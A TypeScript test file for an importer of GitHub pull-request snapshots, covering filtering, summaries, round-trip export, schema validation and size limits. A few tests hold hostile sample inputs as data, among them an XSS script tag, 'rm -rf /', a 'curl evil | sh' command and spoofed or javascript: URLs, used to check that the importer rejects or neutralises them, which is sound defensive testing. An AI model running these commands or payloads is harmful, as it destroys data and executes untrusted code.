import test from 'node:test';
import assert from 'node:assert/strict';
import { parsePrSnapshot, filterPrs, summarizePrs, serializePrs, PR_IMPORT_MAX_BYTES } from '../../lib/github-pr-import';

const time = '2026-10-22T07:20:48.756Z';
const fixture = (number = 1, overrides = {}) => ({ repository: 'spaja86/example', repository_visibility: 'public', number, id: number, title: `PR ${number}`, body: 'Opis', status: 'open', state: 'open', draft: false, author: 'spaja86', created_at: time, updated_at: time, retrieved_at: time, merged_at: null, closed_at: null, head: { branch: 'feature', sha: 'a'.repeat(40) }, base: { branch: 'main', sha: 'b'.repeat(40) }, labels: ['test'], url: `https://github.com/spaja86/example/pull/${number}`, ...overrides });
const pack = (rows = [fixture()]) => JSON.stringify({ schema_version: '1.0', owner: 'spaja86', total: rows.length, pull_requests: rows });
const parse = (...rows: ReturnType<typeof fixture>[]) => parsePrSnapshot(pack(rows)).pull_requests;

test('summarizes archive states, drafts and unknown visibility', () => {
  const rows = parse(fixture(1, { draft: true }), fixture(2, { status: 'merged', state: 'closed', merged_at: time, closed_at: time }), fixture(3, { status: 'closed', state: 'closed', closed_at: time, repository_visibility: undefined }));
  const stats = summarizePrs(rows);
  assert.deepEqual([stats.total, stats.open, stats.merged, stats.closed, stats.drafts, stats.nonPublic], [3, 1, 1, 1, 1, 1]);
  assert.equal(stats.retrievedFrom, time);
});
test('combines filters, searches descriptions, sorts without mutating', () => {
  const rows = parse(fixture(1, { draft: true, body: 'Poseban pojam', repository_visibility: 'private' }), fixture(2));
  assert.deepEqual(filterPrs(rows, {}).map(row => row.number), [2, 1]);
  assert.equal(rows[0].number, 1);
  assert.equal(filterPrs(rows, { search: 'POSEBAN', repository: 'spaja86/example', status: 'open', visibility: 'private', draftsOnly: true }).length, 1);
  assert.equal(filterPrs(rows, { status: 'merged', draftsOnly: true }).length, 0);
});
test('export round-trips private bodies and empty selection', () => {
  const rows = parse(fixture(1, { body: 'Tekst\n**markdown**', repository_visibility: 'private' }));
  assert.deepEqual(parsePrSnapshot(serializePrs(rows)).pull_requests, rows);
  assert.equal(parsePrSnapshot(serializePrs([])).total, 0);
});
test('rejects malformed envelopes', () => {
  for (const input of ['{', 'null', '[]', pack().replace('"1.0"', '"2.0"'), pack().replace('"owner":"spaja86"', '"owner":"other"'), pack().replace('"total":1', '"total":0')]) assert.throws(() => parsePrSnapshot(input));
});
test('rejects duplicate IDs and case-insensitive repository/number keys', () => {
  assert.throws(() => parse(fixture(), fixture(2, { id: 1 })));
  assert.throws(() => parse(fixture(), fixture(1, { id: 2, repository: 'spaja86/EXAMPLE', url: 'https://github.com/spaja86/EXAMPLE/pull/1' })));
});
test('allows only canonical owner PR links', () => {
  for (const url of ['javascript:alert(1)', 'https://github.com.evil.test/spaja86/example/pull/1', 'https://evil@github.com/spaja86/example/pull/1', 'https://github.com/spaja86/example/pull/1?x=1', 'https://github.com/spaja86/example/pull/2']) assert.throws(() => parse(fixture(1, { url })));
  assert.throws(() => parse(fixture(1, { repository: 'spaja86/..' })));
});
test('rejects contradictory statuses and invalid typed fields', () => {
  for (const overrides of [{ merged_at: time }, { state: 'closed' }, { status: 'invalid' }, { draft: 'yes' }, { number: 0 }, { id: -1 }, { updated_at: 'today' }, { head: { branch: 'f', sha: 'not-sha' } }, { labels: [1] }, { repository_visibility: 'secret' }]) assert.throws(() => parse(fixture(1, overrides)));
});
test('preserves hostile body as text and discards executable metadata', () => {
  const body = '<script>alert(1)</script>\n![tracking](https://evil.test/pixel)\nrm -rf /';
  const row = parse(fixture(1, { body, command: 'curl evil | sh', ciPassed: true }))[0];
  assert.equal(row.body, body); assert.equal('command' in row, false); assert.equal('ciPassed' in row, false);
});
test('enforces byte and record budgets', () => {
  assert.throws(() => parsePrSnapshot(' '.repeat(PR_IMPORT_MAX_BYTES + 1)), /16 MiB/);
  assert.throws(() => parsePrSnapshot(JSON.stringify({ schema_version: '1.0', owner: 'spaja86', total: 10001, pull_requests: Array(10001).fill(null) })), /10.000/);
});
